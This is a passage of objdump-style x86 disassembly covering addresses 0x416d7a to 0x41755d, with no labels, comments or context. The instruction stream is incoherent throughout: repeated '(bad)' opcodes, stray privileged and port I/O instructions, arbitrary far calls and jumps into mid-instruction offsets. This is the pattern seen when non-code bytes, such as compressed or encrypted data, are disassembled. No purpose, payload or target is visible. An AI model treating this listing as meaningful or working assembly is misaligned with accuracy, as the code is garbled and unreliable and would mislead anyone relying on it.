  416d7a:	mov    esi,0x81588c38
  416d7f:	cs dec esi
  416d81:	push   ebp
  416d82:	ins    BYTE PTR es:[edi],dx
  416d83:	add    esi,ebx
  416d85:	rcl    DWORD PTR [edi+edx*4+0x8],cl
  416d89:	pop    ebp
  416d8a:	fmul   QWORD PTR [ecx]
  416d8c:	push   ebp
  416d8d:	inc    ecx
  416d8e:	loop   0x416de2
  416d90:	sbb    eax,0xbe62f2ef
  416d95:	in     eax,dx
  416d96:	mov    edx,0x1c0a9087
  416d9b:	xlat   BYTE PTR ds:[ebx]
  416d9c:	adc    BYTE PTR [eax],bh
  416d9e:	into   
  416d9f:	jb     0x416dd6
  416da1:	xor    eax,0x8417f2d8
  416da6:	dec    edx
  416da7:	das    
  416da8:	xchg   ebp,eax
  416da9:	iret   
  416daa:	fisttp QWORD PTR [ebx-0x2a]
  416dad:	dec    edx
  416dae:	mov    WORD PTR [ebp-0x1e],cs
  416db1:	pop    ss
  416db2:	mov    DWORD PTR [eax+edx*4-0x10680039],esi
  416db9:	xchg   esi,eax
  416dba:	pop    ebp
  416dbb:	xor    esi,DWORD PTR [ebx+0x632b6553]
  416dc1:	daa    
  416dc2:	imul   bh
  416dc4:	push   ss
  416dc5:	jl     0x416df1
  416dc7:	mov    ds:0xf1fde68a,eax
  416dcc:	(bad)  
  416dcd:	jbe    0x416e0c
  416dcf:	inc    ebx
  416dd0:	lods   al,BYTE PTR ds:[esi]
  416dd1:	xor    dh,BYTE PTR [ebp+0x5e820d78]
  416dd7:	retf   0x6755
  416dda:	inc    edx
  416ddb:	bnd jp 0x416d6a
  416dde:	mov    ds:0x2029cb3a,al
  416de3:	dec    ebx
  416de4:	sbb    dh,BYTE PTR [eax+ebp*4-0x18fbae3b]
  416deb:	pop    ebp
  416dec:	cli    
  416ded:	and    ecx,ebp
  416def:	jne    0x416e30
  416df1:	arpl   WORD PTR [esi],cx
  416df3:	out    0xc4,eax
  416df5:	aas    
  416df6:	sub    DWORD PTR [edx-0x7d6aa570],ebp
  416dfc:	xor    ch,ch
  416dfe:	and    ch,dh
  416e00:	dec    edx
  416e01:	shld   DWORD PTR [esi],edx,cl
  416e04:	shl    edx,cl
  416e06:	pop    edi
  416e07:	pop    ss
  416e08:	aas    
  416e09:	pop    eax
  416e0a:	call   0x1ef4:0xdc5f62df
  416e11:	loope  0x416d9b
  416e13:	ret    0x98ef
  416e16:	push   ss
  416e17:	sub    BYTE PTR [edi-0x5bcbbe4],0xd6
  416e1e:	inc    ebx
  416e1f:	sar    DWORD PTR [ebx+0x5ac3b4ea],0x29
  416e26:	(bad)  
  416e27:	adc    al,bh
  416e29:	dec    esp
  416e2a:	imul   edx,DWORD PTR [edi],0xffffffcc
  416e2d:	test   DWORD PTR [edi+0x68],0x5d150a16
  416e34:	xchg   ebp,eax
  416e35:	push   ds
  416e36:	imul   ebp,DWORD PTR [ecx-0x6e506767],0xfffffff9
  416e3d:	xor    eax,0x9d4d036b
  416e42:	jnp    0x416e91
  416e44:	mov    esp,0x42e05e0
  416e49:	sbb    al,0xbe
  416e4b:	xchg   ebp,eax
  416e4c:	xchg   al,dh
  416e4e:	inc    esp
  416e4f:	mov    esp,0x811354e1
  416e54:	pop    edi
  416e55:	dec    eax
  416e56:	sub    al,0xa6
  416e58:	xchg   BYTE PTR [ebp-0x6f],dh
  416e5b:	cmp    DWORD PTR [ebp+0x37],0x93a4d112
  416e62:	adc    bl,bh
  416e64:	pop    edi
  416e65:	or     bh,BYTE PTR [ecx-0x6699c2c]
  416e6b:	leave  
  416e6c:	adc    ecx,esp
  416e6e:	mov    esi,0xefce87a6
  416e73:	in     eax,dx
  416e74:	adc    DWORD PTR [edi+0x2a23f2b],esp
  416e7a:	inc    esi
  416e7b:	sub    eax,0x66416093
  416e80:	bound  ebx,QWORD PTR [ecx-0x28]
  416e83:	and    DWORD PTR [edi-0x3f500b97],ebp
  416e89:	or     al,0x57
  416e8b:	mov    dh,0xbf
  416e8d:	scas   eax,DWORD PTR es:[edi]
  416e8e:	dec    edi
  416e8f:	cmp    al,0x3
  416e91:	add    BYTE PTR [ecx],0x7e
  416e94:	icebp  
  416e95:	sub    DWORD PTR [ecx+0x44],ebx
  416e98:	mov    ecx,0x49423afa
  416e9d:	pop    eax
  416e9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e9f:	fist   DWORD PTR [esi-0x32]
  416ea2:	or     al,0xa6
  416ea4:	ins    DWORD PTR es:[edi],dx
  416ea5:	cli    
  416ea6:	icebp  
  416ea7:	dec    ebp
  416ea8:	sahf   
  416ea9:	or     ch,BYTE PTR [edi]
  416eab:	retf   0x7dcb
  416eae:	stos   BYTE PTR es:[edi],al
  416eaf:	aas    
  416eb0:	jecxz  0x416e6d
  416eb2:	cs push cs
  416eb4:	pusha  
  416eb5:	inc    esi
  416eb6:	jo     0x416e5b
  416eb8:	dec    edi
  416eb9:	mov    eax,gs:0xc099cfc9
  416ebf:	jae    0x416e80
  416ec1:	jbe    0x416eb3
  416ec3:	and    dh,BYTE PTR [ebp-0x3]
  416ec6:	xchg   BYTE PTR [esi+edi*8-0x79],cl
  416eca:	sub    BYTE PTR [esi+0x6c80f441],al
  416ed0:	shl    bh,1
  416ed2:	jmp    0x416eca
  416ed4:	fs cmp eax,0x76fe867c
  416eda:	cs rcl edi,1
  416edd:	sbb    BYTE PTR [eax+0x6dcb707c],bh
  416ee3:	fisubr WORD PTR [eax-0x46]
  416ee6:	cwde   
  416ee7:	adc    DWORD PTR [esi+edi*2-0x7e12953b],ecx
  416eee:	cmp    al,0x71
  416ef0:	fwait
  416ef1:	inc    esi
  416ef2:	dec    edi
  416ef3:	ror    BYTE PTR [edx-0x48],1
  416ef6:	stc    
  416ef7:	lea    esp,[esi]
  416ef9:	mov    eax,0x8286241b
  416efe:	jne    0x416ed2
  416f00:	push   edi
  416f01:	sub    bl,dh
  416f03:	cmp    dh,BYTE PTR [esi]
  416f05:	push   es
  416f06:	out    0x3d,al
  416f08:	adc    eax,0x6f51bfd4
  416f0d:	cmp    dh,BYTE PTR [eax+0x29]
  416f10:	(bad)  
  416f11:	neg    BYTE PTR [ecx]
  416f13:	mov    ds:0x4981ba95,eax
  416f18:	pop    es
  416f19:	in     al,0x54
  416f1b:	es sub eax,0x4c3cb081
  416f21:	cmp    BYTE PTR [ecx],0x88
  416f24:	cli    
  416f25:	sub    al,cl
  416f27:	stos   DWORD PTR es:[edi],eax
  416f28:	adc    al,0xa0
  416f2a:	mov    dh,0x58
  416f2c:	push   ds
  416f2d:	jo     0x416f3c
  416f2f:	add    eax,0x6e046e50
  416f34:	movntq QWORD PTR [ebx-0x43],mm0
  416f38:	push   ss
  416f39:	out    0xdc,eax
  416f3b:	sti    
  416f3c:	xchg   edx,eax
  416f3d:	adc    esp,DWORD PTR [ebx+0x507e7e34]
  416f43:	jmp    0xf5ae:0x93cda0ad
  416f4a:	mov    edx,DWORD PTR [edi-0x71]
  416f4d:	push   ebp
  416f4e:	dec    ebx
  416f4f:	xor    eax,0x4ad267bc
  416f54:	push   es
  416f55:	and    bh,BYTE PTR [ebp-0x1]
  416f58:	add    DWORD PTR [edx],0xffffff89
  416f5b:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  416f5d:	adc    al,ah
  416f5f:	and    eax,ebx
  416f61:	mov    cl,0x7e
  416f63:	adc    edi,DWORD PTR [edx]
  416f65:	imul   ebx,ecx,0xffffffae
  416f68:	xor    eax,0x20c9a4b6
  416f6d:	jns    0x416f2e
  416f6f:	mov    al,ds:0xdd77feda
  416f74:	adc    al,0x51
  416f76:	push   eax
  416f77:	int    0xf9
  416f79:	out    dx,eax
  416f7a:	pusha  
  416f7b:	or     al,0x9
  416f7d:	inc    esi
  416f7e:	xchg   esp,eax
  416f7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f80:	ss ret 0x13d0
  416f84:	cmp    ch,dh
  416f86:	jp     0x416f80
  416f88:	int    0x3
  416f8a:	xor    eax,0x4bc17435
  416f8f:	std    
  416f90:	dec    esi
  416f91:	mov    ds:0x48118e5f,al
  416f96:	sbb    eax,0xad191c93
  416f9b:	cwde   
  416f9c:	inc    esp
  416f9d:	aas    
  416f9e:	adc    al,0xdb
  416fa0:	cmp    ch,dl
  416fa2:	xchg   edi,eax
  416fa3:	dec    ebp
  416fa4:	lea    ebx,[ecx-0x5b]
  416fa7:	fnsave [ebp+0xf]
  416faa:	cmp    dl,BYTE PTR [eax*8-0xc6288db]
  416fb1:	gs dec edx
  416fb3:	mov    ds:0xfe6f95e4,eax
  416fb8:	mov    edx,0xe00e4f38
  416fbd:	push   edi
  416fbe:	aam    0xfd
  416fc0:	pop    esp
  416fc1:	xor    ecx,esi
  416fc3:	fwait
  416fc4:	icebp  
  416fc5:	test   eax,0x14408871
  416fca:	sti    
  416fcb:	es cmp al,0x4b
  416fce:	jle    0x417004
  416fd0:	cmp    al,dh
  416fd2:	fmul   QWORD PTR [eax-0x4c]
  416fd5:	repz fs std 
  416fd8:	inc    edx
  416fd9:	xchg   esi,eax
  416fda:	test   DWORD PTR [ecx-0x4b],0xa9ba127
  416fe1:	imul   BYTE PTR [ecx]
  416fe3:	fadd   QWORD PTR [edi]
  416fe5:	pop    esp
  416fe6:	push   edi
  416fe7:	push   ss
  416fe8:	sub    BYTE PTR [edi+0x1a],dl
  416feb:	popf   
  416fec:	mov    cl,0xde
  416fee:	sar    al,1
  416ff0:	xchg   bl,bh
  416ff2:	and    al,0xdb
  416ff4:	(bad)  
  416ff6:	push   esp
  416ff7:	add    ecx,DWORD PTR [edi+0x6f11a696]
  416ffd:	xchg   edx,eax
  416ffe:	rol    DWORD PTR [eax-0x3c],cl
  417001:	pusha  
  417002:	stc    
  417003:	fadd   DWORD PTR [ecx-0x45]
  417006:	jp     0x416ff7
  417008:	test   al,0xb6
  41700a:	clc    
  41700b:	retfw  0xb901
  41700f:	inc    ecx
  417010:	pop    esp
  417011:	loopne 0x417060
  417013:	jne    0x41706c
  417015:	push   edx
  417016:	dec    esp
  417017:	push   esp
  417018:	lock adc BYTE PTR [edx-0x51],0x81
  41701d:	out    dx,eax
  41701e:	ins    DWORD PTR es:[edi],dx
  41701f:	cmc    
  417020:	repz adc ebp,DWORD PTR [edx+edx*1-0xb4a3637]
  417028:	mov    edx,0x21c4833f
  41702d:	jno    0x417098
  41702f:	sbb    esi,DWORD PTR [esi]
  417031:	xor    edi,eax
  417033:	test   eax,0x6dc304fc
  417038:	jge    0x417052
  41703a:	in     eax,dx
  41703b:	dec    ebp
  41703c:	pop    eax
  41703d:	xchg   ecx,eax
  41703e:	pop    ebx
  41703f:	hlt    
  417040:	ds pushf 
  417042:	test   BYTE PTR [esi-0x2b],al
  417045:	mov    edx,0x5e1eb077
  41704a:	push   edx
  41704b:	(bad)  
  41704c:	jle    0x4170c2
  41704e:	int3   
  41704f:	mov    ds:0x5bf2af41,eax
  417054:	cmp    ebx,edi
  417056:	pop    es
  417057:	fs jo  0x41706c
  41705a:	dec    edx
  41705b:	out    dx,eax
  41705c:	fist   WORD PTR [ebp+0x6d7c8329]
  417062:	ins    BYTE PTR es:[edi],dx
  417063:	pusha  
  417064:	xor    dl,BYTE PTR [esi-0x2ba05c2d]
  41706a:	add    eax,0x847306fd
  41706f:	pop    ds
  417070:	push   edi
  417071:	enter  0x7da7,0x41
  417075:	or     eax,0xf55b7bdf
  41707a:	or     al,0x86
  41707c:	aas    
  41707d:	std    
  41707e:	add    esp,esi
  417080:	inc    esp
  417081:	sub    dh,BYTE PTR [ebx+0x67]
  417084:	mov    eax,0x4228fef6
  417089:	mov    ds:0x5342b41b,eax
  41708e:	dec    ebp
  41708f:	out    0x9f,eax
  417091:	es cmp eax,0xf4a979a6
  417097:	popf   
  417098:	mov    eax,0x946bd974
  41709d:	mov    ebp,0x5ee2eb34
  4170a2:	out    0x85,eax
  4170a4:	or     eax,0x76a81c1
  4170a9:	adc    BYTE PTR ds:0x24f9c96,dl
  4170af:	add    BYTE PTR [ebp+0x3a],dh
  4170b2:	add    eax,0x79592828
  4170b7:	and    eax,DWORD PTR [ecx+0x21]
  4170ba:	(bad)  
  4170bc:	sub    cl,BYTE PTR [edi-0x20]
  4170bf:	or     DWORD PTR [ebx-0x1f71175d],edi
  4170c5:	mov    dh,0xda
  4170c7:	add    edi,eax
  4170c9:	and    DWORD PTR [ebx],ebp
  4170cb:	mov    BYTE PTR [edx],bl
  4170cd:	pop    esi
  4170ce:	out    dx,eax
  4170cf:	fdivp  st(0),st
  4170d1:	xchg   DWORD PTR [edx+0x4c],edx
  4170d4:	loopne 0x41712e
  4170d6:	mov    dl,0xb5
  4170d8:	hlt    
  4170d9:	cmp    ebx,DWORD PTR [eax+0x73]
  4170dc:	idiv   BYTE PTR [ebx-0x2b]
  4170df:	push   cs
  4170e0:	pop    edi
  4170e1:	xchg   ecx,eax
  4170e2:	pop    edx
  4170e3:	retf   0x9916
  4170e6:	enter  0xee7d,0x8d
  4170ea:	test   ebx,edx
  4170ec:	mov    cr1,edx
  4170ef:	jnp    0x41709a
  4170f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170f2:	mov    eax,0x17066b79
  4170f7:	sub    eax,0xf678ec7d
  4170fc:	mov    edx,0xca9f50b1
  417101:	cmp    ch,dl
  417103:	inc    ebp
  417104:	daa    
  417105:	pop    esp
  417106:	cmp    ch,BYTE PTR [esi+0x3]
  417109:	push   edi
  41710a:	cmp    eax,0xf4f1dfce
  41710f:	stc    
  417110:	xchg   edx,eax
  417111:	fwait
  417112:	data16 adc BYTE PTR gs:[eax],bh
  417116:	mov    ds:0x50c9dc3,al
  41711b:	(bad)  
  41711c:	and    edx,eax
  41711e:	or     DWORD PTR [ecx+0x456ee2a3],edx
  417124:	dec    ebp
  417125:	jp     0x417151
  417127:	icebp  
  417128:	xchg   edi,eax
  417129:	dec    ebp
  41712a:	sti    
  41712b:	xor    dl,BYTE PTR [edi]
  41712d:	cmp    DWORD PTR [edx],ecx
  41712f:	sub    esp,DWORD PTR [ecx+eax*2-0x378b1560]
  417136:	pop    ss
  417137:	or     al,0x54
  417139:	test   DWORD PTR [esi],edx
  41713b:	lods   eax,DWORD PTR gs:[esi]
  41713d:	jb     0x417179
  41713f:	sub    eax,0x70cd7a18
  417144:	repz js 0x4170eb
  417147:	add    al,0x2
  417149:	ss pushf 
  41714b:	xor    al,0x6b
  41714d:	add    ebp,DWORD PTR [ecx-0x1a]
  417150:	or     edx,DWORD PTR [ebp+0x21d09ddf]
  417156:	gs dec ebp
  417158:	or     esi,DWORD PTR [eax-0x7424e813]
  41715e:	push   ebp
  41715f:	out    0xc5,eax
  417161:	mov    bl,BYTE PTR [edi+0x7a]
  417164:	loope  0x4171a1
  417166:	hlt    
  417167:	jnp    0x4170ea
  417169:	dec    ebp
  41716a:	cmc    
  41716b:	stos   DWORD PTR es:[edi],eax
  41716c:	dec    esp
  41716d:	lds    esi,FWORD PTR [eax]
  41716f:	ds push esi
  417171:	pushf  
  417172:	fs (bad) 
  417174:	mov    ebp,0xb0de7280
  417179:	sbb    esp,DWORD PTR [edx]
  41717b:	xlat   BYTE PTR ds:[ebx]
  41717c:	(bad)  
  41717e:	inc    ebx
  41717f:	scas   al,BYTE PTR es:[edi]
  417180:	ja     0x4171fb
  417182:	pop    ebp
  417183:	sbb    esi,DWORD PTR [edx]
  417185:	cmp    esp,DWORD PTR [eax+0x547a421]
  41718b:	jns    0x4171d7
  41718d:	sub    bl,dl
  41718f:	sbb    DWORD PTR [esi],edi
  417191:	mov    edi,0x7676bbbb
  417196:	popf   
  417197:	and    ch,BYTE PTR [edi]
  417199:	fistp  WORD PTR [ebx+0x36]
  41719c:	adc    al,0xf8
  41719e:	cmp    BYTE PTR [edi],0x4a
  4171a1:	inc    ecx
  4171a2:	cmp    eax,0x4893c979
  4171a7:	jecxz  0x4171fa
  4171a9:	jmp    0xa45:0xb1acf391
  4171b0:	sbb    al,0xe9
  4171b2:	and    BYTE PTR [edi-0x11b2a307],0xfe
  4171b9:	xchg   esp,eax
  4171ba:	les    ecx,FWORD PTR [ecx+0x7a]
  4171bd:	fidiv  DWORD PTR [edi-0x12]
  4171c0:	out    0x71,eax
  4171c2:	xchg   DWORD PTR [ebx+0x2b],edi
  4171c5:	dec    esi
  4171c6:	retf   0x6771
  4171c9:	add    edx,0xffffffe5
  4171cc:	jmp    0x90ac:0x82979920
  4171d3:	xchg   ebx,eax
  4171d4:	push   edx
  4171d5:	imul   edi,ecx,0x8e495db2
  4171db:	pop    eax
  4171dc:	sbb    eax,0x6b51753b
  4171e1:	adc    al,0xe
  4171e3:	xchg   edi,eax
  4171e4:	xchg   ecx,eax
  4171e5:	mov    BYTE PTR [eax-0x2f0f8530],dh
  4171eb:	(bad)  
  4171ec:	jg     0x4171c3
  4171ee:	test   al,bh
  4171f0:	jl     0x41725a
  4171f2:	jg     0x417259
  4171f4:	div    al
  4171f6:	sahf   
  4171f7:	mov    cl,0x4
  4171f9:	mov    es,WORD PTR [si]
  4171fc:	jnp    0x41726c
  4171fe:	scas   eax,DWORD PTR es:[edi]
  4171ff:	sbb    BYTE PTR [edx+0x6b],0xc8
  417203:	jno    0x41724f
  417205:	push   ecx
  417206:	js     0x417277
  417208:	mov    ds:0x25b7b4a7,eax
  41720d:	adc    cl,0x58
  417210:	inc    edi
  417211:	sub    al,0x52
  417213:	ds inc esp
  417215:	inc    eax
  417216:	mov    ds:0xb5dcf44d,al
  41721b:	mov    ds:0x32fa7efb,al
  417220:	push   ss
  417221:	loope  0x417276
  417223:	adc    DWORD PTR [eax-0x2c514575],ebp
  417229:	mov    dh,0x14
  41722b:	mov    WORD PTR [ebp-0x70],?
  41722e:	call   0x3ddf:0x7ae26a4b
  417235:	push   edi
  417236:	(bad)  
  417237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417238:	pop    ds
  417239:	mov    eax,ds:0x6c938813
  41723e:	jge    0x417253
  417240:	aaa    
  417241:	fdivr  QWORD PTR [edx]
  417243:	push   edx
  417244:	or     ecx,esi
  417246:	push   ebp
  417247:	iret   
  417248:	mov    ds:0x294dfc1d,eax
  41724d:	inc    esp
  41724e:	retf   0xebfe
  417251:	in     eax,dx
  417252:	xor    dl,0x95
  417255:	cmp    eax,0xbd0ca264
  41725a:	or     BYTE PTR [ebp+0x7dd6a549],al
  417260:	adc    al,0x5c
  417262:	push   edi
  417263:	jb     0x41722c
  417265:	jmp    0x4724f528
  41726a:	out    dx,eax
  41726b:	mov    al,ds:0x361bc745
  417270:	sbb    eax,0x4d8c2bc3
  417275:	mov    ah,dh
  417277:	jmpw   0xe3dc
  41727b:	sbb    BYTE PTR [edx-0x50a2afe3],bl
  417281:	pop    esi
  417282:	jo     0x417220
  417284:	add    ebp,DWORD PTR [ecx+0x66]
  417287:	inc    edx
  417288:	inc    esp
  417289:	dec    ebp
  41728a:	add    esi,DWORD PTR [eax+0x11]
  41728d:	pop    eax
  41728e:	jecxz  0x417261
  417290:	sub    BYTE PTR [edi-0x3b],0x17
  417294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417295:	add    al,dh
  417297:	mov    bl,0x1a
  417299:	shl    DWORD PTR [eax+0x41],0xc4
  41729d:	jp     0x41727e
  41729f:	repz gs scas eax,DWORD PTR es:[edi]
  4172a2:	aas    
  4172a3:	mov    esp,0xae5ef210
  4172a8:	cs inc eax
  4172aa:	xchg   edx,eax
  4172ab:	mov    ds:0x39c599dc,al
  4172b0:	call   0x5232:0x22763474
  4172b7:	addr16 out dx,eax
  4172b9:	enter  0x98c0,0xb7
  4172bd:	adc    edi,esi
  4172bf:	mov    ch,0xd7
  4172c1:	mov    ebp,0x4e2815be
  4172c6:	loop   0x4172d7
  4172c8:	out    dx,al
  4172c9:	into   
  4172ca:	(bad)  
  4172cb:	jg     0x4172bf
  4172cd:	pushf  
  4172ce:	dec    esi
  4172cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172d0:	popa   
  4172d1:	call   0xfcd74f86
  4172d6:	push   ss
  4172d7:	xchg   esp,eax
  4172d8:	sub    DWORD PTR [edx-0x5],0x2e
  4172dc:	push   esi
  4172dd:	pop    es
  4172de:	pop    es
  4172df:	popf   
  4172e0:	jno    0x4172a8
  4172e2:	js     0x41726c
  4172e4:	cmc    
  4172e5:	pop    eax
  4172e6:	xchg   esi,eax
  4172e7:	cmp    ch,bh
  4172e9:	push   eax
  4172ea:	fs js  0x4172a7
  4172ed:	or     eax,0xa2541e22
  4172f2:	dec    esp
  4172f3:	aas    
  4172f4:	fsub   QWORD PTR [esp+eiz*8+0x5a270a12]
  4172fb:	mov    ds:0x70328240,al
  417300:	ret    
  417301:	xchg   BYTE PTR ds:[ebx-0x6e],dl
  417305:	cmp    DWORD PTR [eax],ecx
  417307:	inc    esp
  417308:	xor    BYTE PTR [esi],ah
  41730a:	inc    esp
  41730b:	xlat   BYTE PTR ds:[ebx]
  41730c:	sbb    eax,0x2bbedf6f
  417311:	jp     0x41736d
  417313:	mov    esp,0xfea2372b
  417318:	push   ss
  417319:	and    al,0x78
  41731b:	dec    esp
  41731c:	fwait
  41731d:	mov    eax,ds:0xa7714d35
  417322:	(bad)  
  417323:	outs   dx,BYTE PTR ds:[esi]
  417324:	pop    esi
  417325:	lods   eax,DWORD PTR ds:[esi]
  417326:	inc    ebp
  417327:	test   BYTE PTR [eax-0x17],al
  41732a:	fucomi st,st(0)
  41732c:	and    DWORD PTR [eax+0xf],0x8543c1cc
  417333:	xor    DWORD PTR [edi+ebx*2-0x34c3f05a],esp
  41733a:	stos   DWORD PTR es:[edi],eax
  41733b:	mov    eax,ds:0xde213f8b
  417340:	pop    ebp
  417341:	loop   0x41730f
  417343:	shr    DWORD PTR [esi],1
  417345:	inc    edx
  417346:	push   ecx
  417347:	cmp    edx,DWORD PTR [ebp-0x51]
  41734a:	push   0xfe88975b
  41734f:	mov    esp,0xdc2be89e
  417354:	sahf   
  417355:	popf   
  417356:	adc    eax,0x1655952d
  41735b:	jg     0x41738b
  41735d:	mov    DWORD PTR [ebp-0x29],esp
  417360:	jge    0x417334
  417362:	ins    BYTE PTR es:[edi],dx
  417363:	add    DWORD PTR [ebx+eiz*1+0x7],edx
  417367:	fs ja  0x417325
  41736a:	test   BYTE PTR [esi],dl
  41736c:	and    al,0xf8
  41736e:	mov    esi,0x9146cbc7
  417373:	dec    si
  417375:	sahf   
  417376:	out    dx,eax
  417377:	add    eax,DWORD PTR [eax]
  417379:	push   ecx
  41737a:	rcl    BYTE PTR [edi-0x2a],cl
  41737d:	jmp    0xe14cffed
  417382:	lds    ebp,FWORD PTR ds:0xdd912230
  417388:	popa   
  417389:	pop    eax
  41738a:	(bad)  
  41738b:	nop
  41738c:	mov    ebx,DWORD PTR [eax-0x54]
  41738f:	mov    eax,0xb026ace5
  417394:	or     ch,BYTE PTR [edx]
  417396:	sbb    eax,DWORD PTR [edi+ebx*1+0x62d2d091]
  41739d:	jmp    0x4173db
  41739f:	into   
  4173a0:	mov    edi,DWORD PTR [ebx-0x176cae69]
  4173a6:	ss xchg edx,eax
  4173a8:	pushf  
  4173a9:	xchg   esi,eax
  4173aa:	enter  0x307b,0xed
  4173ae:	sub    ecx,DWORD PTR [esi+0x67]
  4173b1:	ins    DWORD PTR es:[edi],dx
  4173b2:	pop    ebx
  4173b3:	imul   eax,edx,0xffffffa6
  4173b6:	aam    0x5a
  4173b8:	stos   DWORD PTR es:[edi],eax
  4173b9:	scas   eax,DWORD PTR es:[edi]
  4173ba:	and    eax,0x14f87299
  4173bf:	daa    
  4173c0:	(bad)  
  4173c1:	jg     0x417419
  4173c3:	bnd ret 
  4173c5:	mov    edx,0x92647638
  4173ca:	mov    esp,0xc5482298
  4173cf:	xchg   ebp,eax
  4173d0:	popa   
  4173d1:	jl     0x417389
  4173d3:	scas   eax,DWORD PTR es:[edi]
  4173d4:	push   esp
  4173d5:	lds    ebp,FWORD PTR [edx+0x45]
  4173d8:	jo     0x4173d4
  4173da:	mov    al,0x6
  4173dc:	dec    edx
  4173dd:	adc    al,0x94
  4173df:	and    cl,0x40
  4173e2:	dec    eax
  4173e3:	push   ss
  4173e4:	mov    dh,0xd4
  4173e6:	pop    edx
  4173e7:	dec    ebp
  4173e8:	enter  0xa5c0,0x72
  4173ec:	xchg   esi,eax
  4173ed:	push   ecx
  4173ee:	daa    
  4173ef:	icebp  
  4173f0:	pusha  
  4173f1:	mov    dl,0x17
  4173f3:	dec    ebx
  4173f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173f6:	dec    edx
  4173f7:	loop   0x41741f
  4173f9:	lods   al,BYTE PTR ds:[esi]
  4173fa:	push   ss
  4173fb:	leave  
  4173fc:	imul   ecx,edx,0xd5328f64
  417402:	sbb    BYTE PTR [eax+0x68],0x83
  417406:	nop
  417407:	adc    bh,BYTE PTR [esp+edx*8]
  41740a:	adc    esi,DWORD PTR [ecx+ebp*2-0x57]
  41740e:	loopne 0x4173b2
  417410:	int    0xed
  417412:	sub    BYTE PTR [esi-0x76],al
  417415:	xor    BYTE PTR [esi],ch
  417417:	cmc    
  417418:	sub    esp,DWORD PTR [edx]
  41741a:	mov    edi,0xaa4c2451
  41741f:	adc    dl,cl
  417421:	add    al,0xfa
  417423:	push   es
  417424:	les    ebp,FWORD PTR [ebx]
  417426:	xchg   ebx,eax
  417427:	and    BYTE PTR [eax],al
  417429:	(bad)  
  41742a:	mov    ecx,0xe9ce83cb
  41742f:	xchg   ebp,eax
  417430:	xchg   esi,eax
  417431:	mov    al,0xab
  417433:	call   0xb4c354d9
  417438:	mov    edi,0x79427657
  41743d:	pop    ecx
  41743e:	adc    BYTE PTR [ebx-0x6842931f],dh
  417444:	mov    ebx,0x2ab69e47
  417449:	mov    edx,0xeeca8d28
  41744e:	or     eax,0x3d6a1692
  417453:	push   ds
  417454:	pop    edi
  417455:	ins    BYTE PTR es:[edi],dx
  417456:	or     eax,0x69a2b62f
  41745b:	jnp    0x4174ca
  41745d:	pop    ss
  41745e:	call   0xef1e:0x8e5d407c
  417465:	push   es
  417466:	mov    ecx,0x9c0dc56c
  41746b:	hlt    
  41746c:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41746e:	xchg   ecx,eax
  41746f:	mov    WORD PTR [ebx+0x7659593f],gs
  417475:	or     DWORD PTR [eax],0xd7c5820c
  41747b:	and    dl,BYTE PTR ds:0x84c5072a
  417481:	and    al,0xf9
  417483:	push   ecx
  417484:	cmp    al,0x1a
  417486:	stos   DWORD PTR es:[edi],eax
  417487:	add    DWORD PTR [ebp-0x12d4e786],eax
  41748d:	pusha  
  41748e:	neg    DWORD PTR [ebx-0x25]
  417491:	sbb    eax,0x4a526f3d
  417496:	sub    al,0x4a
  417498:	shr    dh,0xb6
  41749b:	mov    esi,0x52a5afe6
  4174a0:	mov    esi,edx
  4174a2:	mov    cl,0x69
  4174a4:	rcr    BYTE PTR [esi-0x6ad6fd53],0xae
  4174ab:	(bad)  
  4174ac:	mov    ebx,0x9f2a388e
  4174b1:	adc    ebp,DWORD PTR [ebx-0x32]
  4174b4:	add    eax,0xe5150a69
  4174b9:	push   ecx
  4174ba:	sbb    al,0xbc
  4174bc:	sbb    al,0x5b
  4174be:	inc    edi
  4174bf:	call   0x1a43fe29
  4174c4:	xchg   edx,eax
  4174c5:	shr    BYTE PTR [esi+0x63],1
  4174c8:	aad    0xb5
  4174ca:	mov    bh,0x44
  4174cc:	dec    esp
  4174cd:	jmp    0x70983494
  4174d2:	mov    ebp,0x68c8d1e9
  4174d7:	xor    eax,0xf9915b1c
  4174dc:	lods   al,BYTE PTR ds:[esi]
  4174dd:	bound  ecx,QWORD PTR [edi+eiz*8+0x7caac78e]
  4174e4:	cmp    DWORD PTR [edx],eax
  4174e6:	add    DWORD PTR [edi-0x521bde9e],ebp
  4174ec:	ins    DWORD PTR es:[edi],dx
  4174ed:	inc    ebp
  4174ee:	icebp  
  4174ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174f0:	and    DWORD PTR [ebp+0x6b3fd14],esi
  4174f6:	inc    esi
  4174f7:	frstor [esi-0xf12cfcd]
  4174fd:	jmp    0x4e1f:0xdb09237a
  417504:	inc    edi
  417505:	sub    al,0xc5
  417507:	loope  0x417573
  417509:	cld    
  41750a:	hlt    
  41750b:	cld    
  41750c:	cmc    
  41750d:	xor    ebx,DWORD PTR [edi]
  41750f:	jmp    0xc07c:0xd9161d08
  417516:	mov    al,ds:0x41fc4c02
  41751b:	ds push es
  41751d:	dec    ecx
  41751e:	shl    DWORD PTR [edi],cl
  417520:	outs   dx,BYTE PTR ds:[esi]
  417521:	cmp    al,0x3b
  417523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417524:	dec    ebp
  417525:	or     esp,DWORD PTR [edi+0x1f0b2e00]
  41752b:	div    DWORD PTR [ebp-0x41]
  41752e:	push   edi
  41752f:	pop    edx
  417530:	ret    0x7747
  417533:	cmp    BYTE PTR [eax+0x41dc6b48],0xaf
  41753a:	(bad)  
  41753c:	arpl   WORD PTR [ebp+0x64],sp
  41753f:	stc    
  417540:	dec    ebx
  417541:	xlat   BYTE PTR ds:[ebx]
  417542:	(bad)  
  417543:	sahf   
  417544:	mov    eax,ds:0x920f72e4
  417549:	xchg   esp,eax
  41754a:	inc    edi
  41754b:	xor    DWORD PTR gs:[edi+esi*1-0x205baf13],ebp
  417553:	inc    edx
  417554:	cmp    DWORD PTR [esi+eax*4-0x73c0bcbb],eax
  41755b:	adc    al,0xa1
  41755d:	push   es
